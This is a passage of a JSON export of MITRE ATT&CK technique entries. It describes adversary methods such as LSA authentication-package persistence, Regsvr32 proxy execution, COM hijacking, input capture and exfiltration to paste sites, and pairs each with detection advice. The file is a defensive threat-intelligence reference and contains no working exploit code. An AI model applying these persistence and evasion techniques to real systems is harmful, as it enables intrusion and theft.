      "detection": "SSL/TLS inspection is one way of detecting command and control traffic within some encrypted communication channels.(Citation: SANS Decrypting SSL) SSL/TLS inspection does come with certain risks that should be considered before implementing to avoid potential security issues such as incomplete certificate validation.(Citation: SEI SSL Inspection Risks)\n\nIn general, analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.(Citation: University of Birmingham C2)"
    },
    "T1547.002": {
      "id": "T1547.002",
      "name": "Authentication Package",
      "description": "Adversaries may abuse authentication packages to execute DLLs when the system boots. Windows authentication package DLLs are loaded by the Local Security Authority (LSA) process at system start. They provide support for multiple logon processes and multiple security protocols to the operating system.(Citation: MSDN Authentication Packages)\n\nAdversaries can use the autostart mechanism provided by LSA authentication packages for persistence by placing a reference to a binary in the Windows Registry location <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\</code> with the key value of <code>\"Authentication Packages\"=&lt;target binary&gt;</code>. The binary will then be executed by the system when the authentication packages are loaded.",
      "tactic": "persistence",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1547.002",
      "stix_id": "attack-pattern--b8cfed42-6a8a-4989-ad72-541af74475ec",
      "created": "2020-01-24T14:54:42.757000+00:00",
      "modified": "2025-04-16T20:37:19.684000+00:00",
      "platforms": [
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "Command: Command Execution",
        "Windows Registry: Windows Registry Key Modification",
        "Module: Module Load"
      ],
      "defense_bypassed": [],
      "detection": "Monitor the Registry for changes to the LSA Registry keys. Monitor the LSA process for DLL loads. Windows 8.1 and Windows Server 2012 R2 may generate events when unsigned DLLs try to load into the LSA by setting the Registry key <code>HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\LSASS.exe</code> with AuditLevel = 8. (Citation: Graeber 2014) (Citation: Microsoft Configure LSA)"
    },
    "T1218.010": {
      "id": "T1218.010",
      "name": "Regsvr32",
      "description": "Adversaries may abuse Regsvr32.exe to proxy execution of malicious code. Regsvr32.exe is a command-line program used to register and unregister object linking and embedding controls, including dynamic link libraries (DLLs), on Windows systems. The Regsvr32.exe binary may also be signed by Microsoft. (Citation: Microsoft Regsvr32)\n\nMalicious usage of Regsvr32.exe may avoid triggering security tools that may not monitor execution of, and modules loaded by, the regsvr32.exe process because of allowlists or false positives from Windows using regsvr32.exe for normal operations. Regsvr32.exe can also be used to specifically bypass application control using functionality to load COM scriptlets to execute DLLs under user permissions. Since Regsvr32.exe is network and proxy aware, the scripts can be loaded by passing a uniform resource locator (URL) to file on an external Web server as an argument during invocation. This method makes no changes to the Registry as the COM object is not actually registered, only executed. (Citation: LOLBAS Regsvr32) This variation of the technique is often referred to as a \"Squiblydoo\" and has been used in campaigns targeting governments. (Citation: Carbon Black Squiblydoo Apr 2016) (Citation: FireEye Regsvr32 Targeting Mongolian Gov)\n\nRegsvr32.exe can also be leveraged to register a COM Object used to establish persistence via [Component Object Model Hijacking](https://attack.mitre.org/techniques/T1546/015). (Citation: Carbon Black Squiblydoo Apr 2016)",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1218.010",
      "stix_id": "attack-pattern--b97f1d35-4249-4486-a6b5-ee60ccf24fab",
      "created": "2020-01-23T19:52:17.414000+00:00",
      "modified": "2025-04-16T20:37:19.846000+00:00",
      "platforms": [
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "Module: Module Load",
        "Command: Command Execution",
        "Network Traffic: Network Connection Creation",
        "Process: Process Creation"
      ],
      "defense_bypassed": [],
      "detection": "Use process monitoring to monitor the execution and arguments of regsvr32.exe. Compare recent invocations of regsvr32.exe with prior history of known good arguments and loaded files to determine anomalous and potentially adversarial activity. Command arguments used before and after the regsvr32.exe invocation may also be useful in determining the origin and purpose of the script or DLL being loaded. (Citation: Carbon Black Squiblydoo Apr 2016)"
    },
    "T1567.003": {
      "id": "T1567.003",
      "name": "Exfiltration to Text Storage Sites",
      "description": "Adversaries may exfiltrate data to text storage sites instead of their primary command and control channel. Text storage sites, such as <code>pastebin[.]com</code>, are commonly used by developers to share code and other information.  \n\nText storage sites are often used to host malicious code for C2 communication (e.g., [Stage Capabilities](https://attack.mitre.org/techniques/T1608)), but adversaries may also use these sites to exfiltrate collected data. Furthermore, paid features and encryption options may allow adversaries to conceal and store data more securely.(Citation: Pastebin EchoSec)\n\n**Note:** This is distinct from [Exfiltration to Code Repository](https://attack.mitre.org/techniques/T1567/001), which highlight access to code repositories via APIs.",
      "tactic": "exfiltration",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1567.003",
      "stix_id": "attack-pattern--ba04e672-da86-4e69-aa15-0eca5db25f43",
      "created": "2023-02-27T22:51:27.101000+00:00",
      "modified": "2025-04-15T19:59:01.716000+00:00",
      "platforms": [
        "Linux",
        "macOS",
        "Windows",
        "ESXi"
      ],
      "permissions_required": [],
      "data_sources": [
        "Network Traffic: Network Traffic Content",
        "Network Traffic: Network Traffic Flow"
      ],
      "defense_bypassed": [],
      "detection": ""
    },
    "T1592.002": {
      "id": "T1592.002",
      "name": "Software",
      "description": "Adversaries may gather information about the victim's host software that can be used during targeting. Information about installed software may include a variety of details such as types and versions on specific hosts, as well as the presence of additional components that might be indicative of added defensive protections (ex: antivirus, SIEMs, etc.).\n\nAdversaries may gather this information in various ways, such as direct collection actions via [Active Scanning](https://attack.mitre.org/techniques/T1595) (ex: listening ports, server banners, user agent strings) or [Phishing for Information](https://attack.mitre.org/techniques/T1598). Adversaries may also compromise sites then include malicious content designed to collect host information from visitors.(Citation: ATT ScanBox) Information about the installed software may also be exposed to adversaries via online or other accessible data sets (ex: job postings, network maps, assessment reports, resumes, or purchase invoices). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or for initial access (ex: [Supply Chain Compromise](https://attack.mitre.org/techniques/T1195) or [External Remote Services](https://attack.mitre.org/techniques/T1133)).",
      "tactic": "reconnaissance",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1592.002",
      "stix_id": "attack-pattern--baf60e1a-afe5-4d31-830f-1b1ba2351884",
      "created": "2020-10-02T16:42:17.482000+00:00",
      "modified": "2025-04-15T23:09:53.612000+00:00",
      "platforms": [
        "PRE"
      ],
      "permissions_required": [],
      "data_sources": [
        "Internet Scan: Response Content"
      ],
      "defense_bypassed": [],
      "detection": "Internet scanners may be used to look for patterns associated with malicious content designed to collect host software information from visitors.(Citation: ThreatConnect Infrastructure Dec 2020)(Citation: ATT ScanBox)\n\nMuch of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access."
    },
    "T1056": {
      "id": "T1056",
      "name": "Input Capture",
      "description": "Adversaries may use methods of capturing user input to obtain credentials or collect information. During normal system usage, users often provide credentials to various different locations, such as login pages/portals or system dialog boxes. Input capture mechanisms may be transparent to the user (e.g. [Credential API Hooking](https://attack.mitre.org/techniques/T1056/004)) or rely on deceiving the user into providing input into what they believe to be a genuine service (e.g. [Web Portal Capture](https://attack.mitre.org/techniques/T1056/003)).",
      "tactic": "collection",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1056",
      "stix_id": "attack-pattern--bb5a00de-e086-4859-a231-fa793f6797e2",
      "created": "2017-05-31T21:30:48.323000+00:00",
      "modified": "2025-04-15T19:59:02.160000+00:00",
      "platforms": [
        "Linux",
        "Network Devices",
        "Windows",
        "macOS"
      ],
      "permissions_required": [],
      "data_sources": [
        "File: File Modification",
        "Process: Process Creation",
        "Module: Module Load",
        "File: File Creation",
        "Windows Registry: Windows Registry Key Modification",
        "Process: Process Metadata",
        "Command: Command Execution",
        "Process: OS API Execution",
        "Driver: Driver Load"
      ],
      "defense_bypassed": [],
      "detection": "Detection may vary depending on how input is captured but may include monitoring for certain Windows API calls (e.g. `SetWindowsHook`, `GetKeyState`, and `GetAsyncKeyState`)(Citation: Adventures of a Keystroke), monitoring for malicious instances of [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059), and ensuring no unauthorized drivers or kernel modules that could indicate keylogging or API hooking are present."
    },
    "T1566.004": {
      "id": "T1566.004",
      "name": "Spearphishing Voice",
      "description": "Adversaries may use voice communications to ultimately gain access to victim systems. Spearphishing voice is a specific variant of spearphishing. It is different from other forms of spearphishing in that is employs the use of manipulating a user into providing access to systems through a phone call or other forms of voice communications. Spearphishing frequently involves social engineering techniques, such as posing as a trusted source (ex: [Impersonation](https://attack.mitre.org/techniques/T1656)) and/or creating a sense of urgency or alarm for the recipient.\n\nAll forms of phishing are electronically delivered social engineering. In this scenario, adversaries are not directly sending malware to a victim vice relying on [User Execution](https://attack.mitre.org/techniques/T1204) for delivery and execution. For example, victims may receive phishing messages that instruct them to call a phone number where they are directed to visit a malicious URL, download malware,(Citation: sygnia Luna Month)(Citation: CISA Remote Monitoring and Management Software) or install adversary-accessible remote management tools ([Remote Access Tools](https://attack.mitre.org/techniques/T1219)) onto their computer.(Citation: Unit42 Luna Moth)\n\nAdversaries may also combine voice phishing with [Multi-Factor Authentication Request Generation](https://attack.mitre.org/techniques/T1621) in order to trick users into divulging MFA credentials or accepting authentication prompts.(Citation: Proofpoint Vishing)",
      "tactic": "initial-access",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1566.004",
      "stix_id": "attack-pattern--bb5e59c4-abe7-40c7-8196-e373cb1e5974",
      "created": "2023-09-07T21:50:08.827000+00:00",
      "modified": "2025-04-15T19:59:02.243000+00:00",
      "platforms": [
        "Linux",
        "macOS",
        "Windows",
        "Identity Provider"
      ],
      "permissions_required": [],
      "data_sources": [
        "Application Log: Application Log Content"
      ],
      "defense_bypassed": [],
      "detection": ""
    },
    "T1587.004": {
      "id": "T1587.004",
      "name": "Exploits",
      "description": "Adversaries may develop exploits that can be used during targeting. An exploit takes advantage of a bug or vulnerability in order to cause unintended or unanticipated behavior to occur on computer hardware or software. Rather than finding/modifying exploits from online or purchasing them from exploit vendors, an adversary may develop their own exploits.(Citation: NYTStuxnet) Adversaries may use information acquired via [Vulnerabilities](https://attack.mitre.org/techniques/T1588/006) to focus exploit development efforts. As part of the exploit development process, adversaries may uncover exploitable vulnerabilities through methods such as fuzzing and patch analysis.(Citation: Irongeek Sims BSides 2017)\n\nAs with legitimate development efforts, different skill sets may be required for developing exploits. The skills needed may be located in-house, or may need to be contracted out. Use of a contractor may be considered an extension of that adversary's exploit development capabilities, provided the adversary plays a role in shaping requirements and maintains an initial degree of exclusivity to the exploit.\n\nAdversaries may use exploits during various phases of the adversary lifecycle (i.e. [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190), [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203), [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068), [Exploitation for Defense Evasion](https://attack.mitre.org/techniques/T1211), [Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212), [Exploitation of Remote Services](https://attack.mitre.org/techniques/T1210), and [Application or System Exploitation](https://attack.mitre.org/techniques/T1499/004)).",
      "tactic": "resource-development",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1587.004",
      "stix_id": "attack-pattern--bbc3cba7-84ae-410d-b18b-16750731dfa2",
      "created": "2020-10-01T01:48:15.511000+00:00",
      "modified": "2025-04-15T22:33:51.026000+00:00",
      "platforms": [
        "PRE"
      ],
      "permissions_required": [],
      "data_sources": [],
      "defense_bypassed": [],
      "detection": "Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on behaviors relating to the use of exploits (i.e. [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190), [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203), [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068), [Exploitation for Defense Evasion](https://attack.mitre.org/techniques/T1211), [Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212), [Exploitation of Remote Services](https://attack.mitre.org/techniques/T1210), and [Application or System Exploitation](https://attack.mitre.org/techniques/T1499/004))."
    },
    "T1593.001": {
      "id": "T1593.001",
      "name": "Social Media",
      "description": "Adversaries may search social media for information about victims that can be used during targeting. Social media sites may contain various information about a victim organization, such as business announcements as well as information about the roles, locations, and interests of staff.\n\nAdversaries may search in different social media sites depending on what information they seek to gather. Threat actors may passively harvest data from these sites, as well as use information gathered to create fake profiles/groups to elicit victim\u2019s into revealing specific information (i.e. [Spearphishing Service](https://attack.mitre.org/techniques/T1598/001)).(Citation: Cyware Social Media) Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), and/or initial access (ex: [Spearphishing via Service](https://attack.mitre.org/techniques/T1566/003)).",
      "tactic": "reconnaissance",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1593.001",
      "stix_id": "attack-pattern--bbe5b322-e2af-4a5e-9625-a4e62bf84ed3",
      "created": "2020-10-02T16:49:31.262000+00:00",
      "modified": "2025-04-15T23:08:29.336000+00:00",
      "platforms": [
        "PRE"
      ],
      "permissions_required": [],
      "data_sources": [],
      "defense_bypassed": [],
      "detection": "Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.\n\nDetection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access."
    },
    "T1213.004": {
      "id": "T1213.004",
      "name": "Customer Relationship Management Software",
      "description": "Adversaries may leverage Customer Relationship Management (CRM) software to mine valuable information. CRM software is used to assist organizations in tracking and managing customer interactions, as well as storing customer data.\n\nOnce adversaries gain access to a victim organization, they may mine CRM software for customer data. This may include personally identifiable information (PII) such as full names, emails, phone numbers, and addresses, as well as additional details such as purchase histories and IT support interactions. By collecting this data, an adversary may be able to send personalized [Phishing](https://attack.mitre.org/techniques/T1566) emails, engage in SIM swapping, or otherwise target the organization\u2019s customers in ways that enable financial gain or the compromise of additional organizations.(Citation: Bleeping Computer US Cellular Hack 2022)(Citation: Bleeping Computer Mint Mobile Hack 2021)(Citation: Bleeping Computer Bank Hack 2020)\n\nCRM software may be hosted on-premises or in the cloud. Information stored in these solutions may vary based on the specific instance or environment. Examples of CRM software include Microsoft Dynamics 365, Salesforce, Zoho, Zendesk, and HubSpot.",
      "tactic": "collection",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1213.004",
      "stix_id": "attack-pattern--bbfbb096-6561-4d7d-aa2c-a5ee8e44c696",
      "created": "2024-07-01T20:06:13.664000+00:00",
      "modified": "2025-04-15T22:12:49.744000+00:00",
      "platforms": [
        "SaaS"
      ],
      "permissions_required": [],
      "data_sources": [
        "Logon Session: Logon Session Creation",
        "Application Log: Application Log Content"
      ],
      "defense_bypassed": [],
      "detection": ""
    },
    "T1546.015": {
      "id": "T1546.015",
      "name": "Component Object Model Hijacking",
      "description": "Adversaries may establish persistence by executing malicious content triggered by hijacked references to Component Object Model (COM) objects. COM is a system within Windows to enable interaction between software components through the operating system.(Citation: Microsoft Component Object Model)  References to various COM objects are stored in the Registry. \n\nAdversaries can use the COM system to insert malicious code that can be executed in place of legitimate software through hijacking the COM references and relationships as a means for persistence. Hijacking a COM object requires a change in the Registry to replace a reference to a legitimate system component which may cause that component to not work when executed. When that system component is executed through normal system operation the adversary's code will be executed instead.(Citation: GDATA COM Hijacking) An adversary is likely to hijack objects that are used frequently enough to maintain a consistent level of persistence, but are unlikely to break noticeable functionality within the system as to avoid system instability that could lead to detection. ",
      "tactic": "privilege-escalation",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1546.015",
      "stix_id": "attack-pattern--bc0f5e80-91c0-4e04-9fbb-e4e332c85dae",
      "created": "2020-03-16T14:12:47.923000+00:00",
      "modified": "2025-04-16T20:37:20.012000+00:00",
      "platforms": [
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "Process: Process Creation",
        "Module: Module Load",
        "Windows Registry: Windows Registry Key Modification",
        "Command: Command Execution"
      ],
      "defense_bypassed": [],
      "detection": "There are opportunities to detect COM hijacking by searching for Registry references that have been replaced and through Registry operations (ex: [Reg](https://attack.mitre.org/software/S0075)) replacing known binary paths with unknown paths or otherwise malicious content. Even though some third-party applications define user COM objects, the presence of objects within HKEY_CURRENT_USER\\Software\\Classes\\CLSID\\ may be anomalous and should be investigated since user objects will be loaded prior to machine objects in HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\CLSID\\.(Citation: Elastic COM Hijacking) Registry entries for existing COM objects may change infrequently. When an entry with a known good path and binary is replaced or changed to an unusual value to point to an unknown binary in a new location, then it may indicate suspicious behavior and should be investigated.  \n\nLikewise, if software DLL loads are collected and analyzed, any unusual DLL load that can be correlated with a COM object Registry modification may indicate COM hijacking has been performed. "
    },
    "T1589.001": {
      "id": "T1589.001",
      "name": "Credentials",
      "description": "Adversaries may gather credentials that can be used during targeting. Account credentials gathered by adversaries may be those directly associated with the target victim organization or attempt to take advantage of the tendency for users to use the same passwords across personal and business accounts.\n\nAdversaries may gather credentials from potential victims in various ways, such as direct elicitation via [Phishing for Information](https://attack.mitre.org/techniques/T1598). Adversaries may also compromise sites then add malicious content designed to collect website authentication cookies from visitors.(Citation: ATT ScanBox) (Citation: Register Deloitte)(Citation: Register Uber)(Citation: Detectify Slack Tokens)(Citation: Forbes GitHub Creds)(Citation: GitHub truffleHog)(Citation: GitHub Gitrob)(Citation: CNET Leaks) Where multi-factor authentication (MFA) based on out-of-band communications is in use, adversaries may compromise a service provider to gain access to MFA codes and one-time passwords (OTP).(Citation: Okta Scatter Swine 2022)\n\nCredential information may also be exposed to adversaries via leaks to online or other accessible data sets (ex: [Search Engines](https://attack.mitre.org/techniques/T1593/002), breach dumps, code repositories, etc.). Adversaries may purchase credentials from dark web markets, such as Russian Market and 2easy, or through access to Telegram channels that distribute logs from infostealer malware.(Citation: Bleeping Computer 2easy 2021)(Citation: SecureWorks Infostealers 2023)(Citation: Bleeping Computer Stealer Logs 2023)\n\nGathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Phishing for Information](https://attack.mitre.org/techniques/T1598)), establishing operational resources (ex: [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133) or [Valid Accounts](https://attack.mitre.org/techniques/T1078)). ",
      "tactic": "reconnaissance",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1589.001",
      "stix_id": "attack-pattern--bc76d0a4-db11-4551-9ac4-01a469cfb161",
      "created": "2020-10-02T14:55:43.815000+00:00",
      "modified": "2025-04-15T22:11:53.342000+00:00",
      "platforms": [
        "PRE"
      ],
      "permissions_required": [],
      "data_sources": [],
      "defense_bypassed": [],
      "detection": "Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.\n\nDetection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access."
    },
    "T1195.002": {
      "id": "T1195.002",
      "name": "Compromise Software Supply Chain",
      "description": "Adversaries may manipulate application software prior to receipt by a final consumer for the purpose of data or system compromise. Supply chain compromise of software can take place in a number of ways, including manipulation of the application source code, manipulation of the update/distribution mechanism for that software, or replacing compiled releases with a modified version.\n\nTargeting may be specific to a desired victim set or may be distributed to a broad set of consumers but only move on to additional tactics on specific victims.(Citation: Avast CCleaner3 2018)(Citation: Command Five SK 2011)  ",
      "tactic": "initial-access",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1195.002",
      "stix_id": "attack-pattern--bd369cd9-abb8-41ce-b5bb-fff23ee86c00",
      "created": "2020-03-11T14:17:21.153000+00:00",
      "modified": "2025-04-15T22:08:31.739000+00:00",
      "platforms": [
        "Linux",
        "macOS",
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "File: File Metadata"
      ],
      "defense_bypassed": [],
      "detection": "Use verification of distributed binaries through hash checking or other integrity checking mechanisms. Scan downloads for malicious signatures and attempt to test software and updates prior to deployment while taking note of potential suspicious activity. "
    },
    "T1036.003": {
      "id": "T1036.003",
      "name": "Rename Legitimate Utilities",
      "description": "Adversaries may rename legitimate / system utilities to try to evade security mechanisms concerning the usage of those utilities. Security monitoring and control mechanisms may be in place for legitimate utilities adversaries are capable of abusing, including both built-in binaries and tools such as PSExec, AutoHotKey, and IronPython.(Citation: LOLBAS Main Site)(Citation: Huntress Python Malware 2025)(Citation: The DFIR Report AutoHotKey 2023)(Citation: Splunk Detect Renamed PSExec) It may be possible to bypass those security mechanisms by renaming the utility prior to utilization (ex: rename <code>rundll32.exe</code>).(Citation: Elastic Masquerade Ball) An alternative case occurs when a legitimate utility is copied or moved to a different directory and renamed to avoid detections based on these utilities executing from non-standard paths.(Citation: F-Secure CozyDuke)",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1036.003",
      "stix_id": "attack-pattern--bd5b58a4-a52d-4a29-bc0d-3f1d3968eb6b",
      "created": "2020-02-10T20:03:11.691000+00:00",
      "modified": "2025-04-15T19:59:02.921000+00:00",
      "platforms": [
        "Linux",
        "macOS",
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "File: File Modification",
        "Process: Process Metadata",
        "Command: Command Execution",
        "File: File Metadata"
      ],
      "defense_bypassed": [],
      "detection": "If file names are mismatched between the file name on disk and that of the binary's PE metadata, this is a likely indicator that a binary was renamed after it was compiled. Collecting and comparing disk and resource filenames for binaries by looking to see if the InternalName, OriginalFilename, and/or ProductName match what is expected could provide useful leads, but may not always be indicative of malicious activity. (Citation: Elastic Masquerade Ball) Do not focus on the possible names a file could have, but instead on the command-line arguments that are known to be used and are distinct because it will have a better rate of detection.(Citation: Twitter ItsReallyNick Masquerading Update)"
    },
    "T1102.002": {
      "id": "T1102.002",
      "name": "Bidirectional Communication",
      "description": "Adversaries may use an existing, legitimate external Web service as a means for sending commands to and receiving output from a compromised system over the Web service channel. Compromised systems may leverage popular websites and social media to host command and control (C2) instructions. Those infected systems can then send the output from those commands back over that Web service channel. The return traffic may occur in a variety of ways, depending on the Web service being utilized. For example, the return traffic may take the form of the compromised system posting a comment on a forum, issuing a pull request to development project, updating a document hosted on a Web service, or by sending a Tweet. \n\nPopular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection. ",
      "tactic": "command-and-control",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1102.002",
      "stix_id": "attack-pattern--be055942-6e63-49d7-9fa1-9cb7d8a8f3f4",
      "created": "2020-03-14T22:34:03.024000+00:00",
      "modified": "2025-04-25T14:47:51.598000+00:00",
      "platforms": [
        "Linux",
        "macOS",
        "Windows",
        "ESXi"
      ],
      "permissions_required": [],
      "data_sources": [
        "Network Traffic: Network Traffic Content",
        "Network Traffic: Network Connection Creation",
        "Network Traffic: Network Traffic Flow"
      ],
      "defense_bypassed": [],
      "detection": "Host data that can relate unknown or suspicious process activity using a network connection is important to supplement any existing indicators of compromise based on malware command and control signatures and infrastructure or the presence of strong encryption. Packet capture analysis will require SSL/TLS inspection if data is encrypted. Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). User behavior monitoring may help to detect abnormal patterns of activity.(Citation: University of Birmingham C2)"
    },
    "T1203": {
      "id": "T1203",
      "name": "Exploitation for Client Execution",
      "description": "Adversaries may exploit software vulnerabilities in client applications to execute code. Vulnerabilities can exist in software due to unsecure coding practices that can lead to unanticipated behavior. Adversaries can take advantage of certain vulnerabilities through targeted exploitation for the purpose of arbitrary code execution. Oftentimes the most valuable exploits to an offensive toolkit are those that can be used to obtain code execution on a remote system because they can be used to gain access to that system. Users will expect to see files related to the applications they commonly used to do work, so they are a useful target for exploit research and development because of their high utility.\n\nSeveral types exist:\n\n### Browser-based Exploitation\n\nWeb browsers are a common target through [Drive-by Compromise](https://attack.mitre.org/techniques/T1189) and [Spearphishing Link](https://attack.mitre.org/techniques/T1566/002). Endpoint systems may be compromised through normal web browsing or from certain users being targeted by links in spearphishing emails to adversary controlled sites used to exploit the web browser. These often do not require an action by the user for the exploit to be executed.\n\n### Office Applications\n\nCommon office and productivity applications such as Microsoft Office are also targeted through [Phishing](https://attack.mitre.org/techniques/T1566). Malicious files will be transmitted directly as attachments or through links to download them. These require the user to open the document or file for the exploit to run.\n\n### Common Third-party Applications\n\nOther applications that are commonly seen or are part of the software deployed in a target network may also be used for exploitation. Applications such as Adobe Reader and Flash, which are common in enterprise environments, have been routinely targeted by adversaries attempting to gain access to systems. Depending on the software and nature of the vulnerability, some may be exploited in the browser or require the user to open a file. For instance, some Flash exploits have been delivered as objects within Microsoft Office documents.",
      "tactic": "execution",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1203",
      "stix_id": "attack-pattern--be2dcee9-a7a7-4e38-afd6-21b31ecc3d63",
      "created": "2018-04-18T17:59:24.739000+00:00",
      "modified": "2025-04-15T19:59:03.090000+00:00",
      "platforms": [
        "Linux",
        "Windows",
        "macOS"
      ],
      "permissions_required": [],
      "data_sources": [
        "Process: Process Creation",
        "File: File Modification",
        "Application Log: Application Log Content",
        "Network Traffic: Network Traffic Flow"
      ],
      "defense_bypassed": [],
      "detection": "Detecting software exploitation may be difficult depending on the tools available. Also look for behavior on the endpoint system that might indicate successful compromise, such as abnormal behavior of the browser or Office processes. This could include suspicious files written to disk, evidence of [Process Injection](https://attack.mitre.org/techniques/T1055) for attempts to hide execution, evidence of Discovery, or other unusual network traffic that may indicate additional tools transferred to the system."
    },
    "T1595.003": {
      "id": "T1595.003",
      "name": "Wordlist Scanning",
      "description": "Adversaries may iteratively probe infrastructure using brute-forcing and crawling techniques. While this technique employs similar methods to [Brute Force](https://attack.mitre.org/techniques/T1110), its goal is the identification of content and infrastructure rather than the discovery of valid credentials. Wordlists used in these scans may contain generic, commonly used names and file extensions or terms specific to a particular software. Adversaries may also create custom, target-specific wordlists using data gathered from other Reconnaissance techniques (ex: [Gather Victim Org Information](https://attack.mitre.org/techniques/T1591), or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)).\n\nFor example, adversaries may use web content discovery tools such as Dirb, DirBuster, and GoBuster and generic or custom wordlists to enumerate a website\u2019s pages and directories.(Citation: ClearSky Lebanese Cedar Jan 2021) This can help them to discover old, vulnerable pages or hidden administrative portals that could become the target of further operations (ex: [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190) or [Brute Force](https://attack.mitre.org/techniques/T1110)).  \n\nAs cloud storage solutions typically use globally unique names, adversaries may also use target-specific wordlists and tools such as s3recon and GCPBucketBrute to enumerate public and private buckets on cloud infrastructure.(Citation: S3Recon GitHub)(Citation: GCPBucketBrute) Once storage objects are discovered, adversaries may leverage [Data from Cloud Storage](https://attack.mitre.org/techniques/T1530) to access valuable information that can be exfiltrated or used to escalate privileges and move laterally. ",
      "tactic": "reconnaissance",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1595.003",
      "stix_id": "attack-pattern--bed04f7d-e48a-4e76-bd0f-4c57fe31fc46",
      "created": "2022-03-04T18:56:38.844000+00:00",
      "modified": "2025-04-15T23:22:19.165000+00:00",
      "platforms": [
        "PRE"
      ],
      "permissions_required": [],
      "data_sources": [
        "Network Traffic: Network Traffic Content"
      ],
      "defense_bypassed": [],
      "detection": "Monitor for suspicious network traffic that could be indicative of scanning, such as large quantities originating from a single source (especially if the source is known to be associated with an adversary/botnet). Monitor for access to S3 buckets, especially those that are not intended to be publicly accessible. \n\nMuch of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders. \n\nDetection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access."
    },
    "T1667": {
      "id": "T1667",
      "name": "Email Bombing",
      "description": "Adversaries may flood targeted email addresses with an overwhelming volume of messages. This may bury legitimate emails in a flood of spam and disrupt business operations.(Citation: sophos-bombing)(Citation: krebs-email-bombing)\n\nAn adversary may accomplish email bombing by leveraging an automated bot to register a targeted address for e-mail lists that do not validate new signups, such as online newsletters. The result can be a wave of thousands of e-mails that effectively overloads the victim\u2019s inbox.(Citation: krebs-email-bombing)(Citation: hhs-email-bombing)\n\nBy sending hundreds or thousands of e-mails in quick succession, adversaries may successfully divert attention away from and bury legitimate messages including security alerts, daily business processes like help desk tickets and client correspondence, or ongoing scams.(Citation: hhs-email-bombing) This behavior can also be used as a tool of harassment.(Citation: krebs-email-bombing)\n\nThis behavior may be a precursor for [Spearphishing Voice](https://attack.mitre.org/techniques/T1566/004). For example, an adversary may email bomb a target and then follow up with a phone call to fraudulently offer assistance. This social engineering may lead to the use of [Remote Access Software](https://attack.mitre.org/techniques/T1663) to steal credentials, deploy ransomware, conduct [Financial Theft](https://attack.mitre.org/techniques/T1657)(Citation: sophos-bombing), or engage in other malicious activity.(Citation: rapid7-email-bombing)\n",
      "tactic": "impact",
      "sub_techniques": [],
